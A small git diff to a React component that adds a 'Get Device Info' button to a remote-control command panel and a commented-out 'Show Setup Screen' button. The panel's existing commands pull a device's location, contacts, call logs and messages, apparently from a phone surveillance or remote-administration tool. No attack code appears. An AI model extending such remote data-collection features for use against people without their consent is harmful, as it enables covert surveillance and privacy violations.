@@ -7,6 +7,8 @@ import {
   Users,
   Phone,
   MessageSquare,
+  Info,
+  Settings,
 } from 'lucide-react';
 import { LucideIcon } from 'lucide-react';
 import RemoteControlConfigModal, { RemoteControlConfig } from './RemoteControlConfigModal';
@@ -31,7 +33,9 @@ const commandButtons: CommandButton[] = [
   { action: 'get_location', label: 'Get Location', icon: Map, iconColor: 'text-orange-500' },
   { action: 'get_contacts', label: 'Get Contacts', icon: Users, iconColor: 'text-indigo-500' },
   { action: 'get_call_logs', label: 'Get Call Logs', icon: Phone, iconColor: 'text-pink-500' },
-  { action: 'get_messages', label: 'Get Messages', icon: MessageSquare, iconColor: 'text-teal-500' }
+  { action: 'get_messages', label: 'Get Messages', icon: MessageSquare, iconColor: 'text-teal-500' },
+  { action: 'get_telemetry_info', label: 'Get Device Info', icon: Info, iconColor: 'text-cyan-500' },
+  // { action: 'show_setup_screen', label: 'Show Setup Screen', icon: Settings, iconColor: 'text-amber-500' }
 ];
 
 export default function CommandButtons({ onCommandClick, disabled = false }: CommandButtonsProps) {
